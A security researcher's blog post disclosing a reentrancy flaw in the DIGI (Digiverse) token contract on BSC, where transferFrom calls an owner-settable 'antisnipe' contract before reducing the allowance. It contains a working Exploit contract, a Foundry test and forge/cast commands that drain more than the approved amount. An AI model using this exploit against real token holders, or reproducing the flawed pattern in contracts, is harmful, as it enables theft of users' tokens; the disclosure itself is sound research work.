---
title: "[Smartcontract security] Digiverse(DIGI) has a potential backdoor"
categories:
  - web3 security
tags:
  - digi
  - web3
  - smart-contract
---

## TL;DR
I started learning about smart contract and web3 security for more than years. But it has no big progress. Therefore I deciced write down some thing about web3 in a down-mood day of hunting bugs.

## Overview
[Digiverse](https://digiversecrypto.com) is a the world’s first and one-of-a-kind digital metaverse designed to stimulate the senses beyond anything else. Digiverse is the first of the physicalized metaverse environments and is built on an area of ​​7000 square meters (as the website published).
I just went through my previous notes on a nice day and found several lines about [DIGI token](https://www.coingecko.com/en/coins/digiverse-2). I have a simple bot to alert some interesting and new tokens. I believe that it is one of them and I writed the note while checking tokens' contracts.

## Vulnerability
[DIGI contract](https://bscscan.com/token/0x7ec0da57eba5398470c6bcb5518406d885240c85#code) can easy found on bscscan. It is opesource and verified, so it make we can start audit without reversing. 
This token do not much, it just implement the ERC20 stardard:
```js
contract DIGIVERSE is Context, IERC20, Ownable {
  ...
}
```
But if you recheck thoroughly, you will saw an unusual point at overrided `transferFrom` function:
```js
function transferFrom(
    address sender,
    address recipient,
    uint256 amount
) external override returns (bool) {
    uint currentAllowance = _allowances[sender][_msgSender()];
    require(
        currentAllowance >= amount,
        "ERC20: transfer amount exceeds allowance"
    );
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), currentAllowance - amount);
    return true;
}
```
One of first rules in smartcontract security is changing state before doing anything but it is not here. Amount of user's tokens can be used by others via ppproval mechanism. If `B` want to use `A`'s tokens, need doing like follow:
1. `A` call `approve()` with address of `B` and amount of token, call as `m`.
2. `B` can call `transferFrom()` with sender is `A`, amount is less than `m` and address of recipient. `B` can only maximum use `m` tokens.
In DIGI's `transferFrom`, we can see internal function `_transfer` is called for actual edit balance before updating approved number via `_approve()`. When I saw this point, I think about [reentrancy atack](https://www.geeksforgeeks.org/reentrancy-attack-in-smart-contracts/) immediately. I needed one more external call to trigger reentrancy at here and I found it in `_transfer()`:
```js
function _transfer(address from, address to, uint256 amount) private {
  ...
  if (!antisnipeDisable && address(antisnipe) != address(0))
    antisnipe.assureCanTransfer(msg.sender, from, to, amount);
  ...
  _tokenTransfer(from, to, amount);
}
```
During `antisnipeDisable` is `false` as default, `antisnipe` is a contract's address which can be set by owner:
```js
function setAntisnipeAddress(address addr) external onlyOwner {
  antisnipe = IAntisnipe(addr);
}
```
Because `antisnipe.assureCanTransfer()` is called before updating approved number, this function can call `transferFrom()` multiple times with an approved amount which is initialized from the beginning and the will be used tokens can be out of user's approved number.

## Impacts
I think this vulnerability is low impact because it required owner permission to set `antisnipe` address and need user approve amount of token for another. But it can be a good way to scam if the project's development want. Owner can set `antisnipe` contract as a "backdoor", then set owner become address(0x00) (a common way of almost projects to increase people's trust with it). Or in a case where hacker get owner account.
I also tried report to Digiverse's team via multiples way (Twitter, email, report form) but have got no response for a half of year.

## PoC
I used [foundry](https://github.com/foundry-rs/foundry) to settup local environment and demo. I got revert error when implementing DIGIVERSE contract on local. I knew the reason is from routers and factory contract which are inited by hard addresses from mains chain:
```js
constructor() {
  address currentRouter;
  //Adding Variables for all the routers for easier deployment for our customers.
  if (block.chainid == 56 || block.chainid == 31337) {
      currentRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PCS Router
      _noFeeWallet[0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE] = true;//PinkSale Lock
  } else if (block.chainid == 97) {
      currentRouter = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // PCS Testnet
      _noFeeWallet[0x5E5b9bE5fd939c578ABE5800a90C566eeEbA44a5] = true;//PinkSale
  }
  ...
  IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(currentRouter);
  WETH = _uniswapV2Router.WETH();
  uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), WETH);
  ...
}
```
My solution is used a mock router contract:
```js
contract MockFactory {
    function createPair(address token1, address token2) external returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(token1,token2)))));
    }
}
contract MockUniswapV2Router {
    MockFactory fac;
    constructor(){
        fac = new MockFactory();
    }
    function WETH() external pure returns (address) {
        // Return a fake WETH address for testing purposes
        return address(0x10ED43C718714eb63d5aA57B78B54704E256024E); // Common WETH address
    }
    function factory() external returns (address) {
        // Return a fake factory address for testing
        return address(fac);
    }
}
```
then use this address as `currentRouter` in DIGIVERSE's constructor:
```js
contract DIGIVERSE is Context, IERC20, Ownable {
  ...
  constructor(address router) {
    ...
    currentRouter = router;
  }
  ...
}
```
Then, I need a contract as `faked antisnipe` contract:
```js
contract Exploit {
    DIGIVERSE target;
    address public victim;
    bool public trigger;
    uint THREAT_TOKENS = 100;

    constructor(address payable t, address vic){
        target = DIGIVERSE(t);
        victim = vic;
        trigger = false;
    }

    function assureCanTransfer(
        address sender,
        address from,
        address to,
        uint256 amount
    ) public {
        if (!trigger){
            trigger = true;
            target.transferFrom(victim, address(this), THREAT_TOKENS);
        }
    }

    function exploit() public {
        target.transferFrom(victim, address(this), THREAT_TOKENS);
    }
}
```
Ensure that our contract has `assureCanTransfer()` function and it will call `transferFrom()` again to trigger using more than approved amount token. Now, we have 2 options to emulate the attack on local:
1. Using test unit feature of `forge`.
2. Deploy contracts on local and call function like a normal chain network.

My test case is below:
```js
contract MyContractTest is Test {
  DIGIVERSE public target;
  MockUniswapV2Router public mockRouter;
  address public user;
  Exploit public attacker;
  address public owner;
  Utilities internal utils;

  function setUp() public {}

  function testFakeTransfer() public {
    // Create contract and init balance for User
    user = payable(address(uint160(uint256(keccak256(abi.encodePacked("0x0001"))))));
    owner = payable(address(uint160(uint256(keccak256(abi.encodePacked("0x0002"))))));
    console.log("Owner", owner, "User",user);

    // using owner account to create contracts for DIGIVERSE
    vm.startPrank(owner);
    mockRouter = new MockUniswapV2Router();
    target = new DIGIVERSE(address(mockRouter));

    // init balance of user as 1000
    target.transfer(user, 1000);
    vm.stopPrank();

    // Create Exploiter contract and declare labels
    attacker = new Exploit(payable(address(target)),user);

    // Set antisnipe contract address to our exploiter contract
    vm.prank(owner);
    target.setAntisnipeAddress(address(attacker));

    vm.label(user, "User");
    vm.label(address(attacker), "Attacker");
    vm.label(owner, "Owner");
    
    // Test exploit
    uint NUMBER_TOKEN = 100;
    vm.prank(user);
    target.approve(address(attacker), NUMBER_TOKEN);
    console.log("[...] Balance before trigger: ",target.balanceOf(address(attacker)),target.balanceOf(user));
    vm.prank(address(attacker));
    target.transferFrom(user, address(attacker), NUMBER_TOKEN);
    console.log("[###] Balance After trigger: ",target.balanceOf(address(attacker)),target.balanceOf(user));
    console.log("[###] Check trigger:", attacker.trigger());
  }
}
```

If you want implement on local, you can follow:
```bash
# implement MockUniswapV2Router and DIGIVERSE contracts
forge create --rpc-url <RPC> --private-key <owner_privatekey> MockUniswapV2Router
forge create --rpc-url <RPC> --constructor-args <MockUniswapV2Router_address> --private-key <owner_privatekey> src/Digiverse.sol:DIGIVERSE
# init 1000 tokens to user
cast send --rpc-url <RPC> --private-key <owner_privatekey> <DIGIVERSE_address> "transfer(address,uint256)" <user_address> 1000 --chain-id <chain_id>
# implement Exploiter contract
forge create --rpc-url <RPC> --constructor-args <DIGIVERSE_address> <user_address> --private-key <attacker_privatekey> src/Exploit.sol:Exploit
# set antisnipe contract
cast send --rpc-url <RPC> --private-key <owner_privatekey> <DIGIVERSE_address> "setAntisnipeAddress(address)" <Exploiter_address> --chain-id <chain_id>
# user approve to antisnipe contract
cast send --rpc-url <RPC> --private-key <user_privatekey> <DIGIVERSE_address> "approve(address,uint256)(bool)" <Exploiter_address> <Approve_number> --chain-id <chain_id>
# trigger exploit 
cast send <Exploiter_address> "exploit()" --rpc-url <RPC> --private-key <attacker_privatekey> --chain-id <chain_id>
```

## Conclusion
This is not a critical vulnerability but it still make potential risks exist. I also learned about using `foundry` to help me auditting, testing and developing demo.
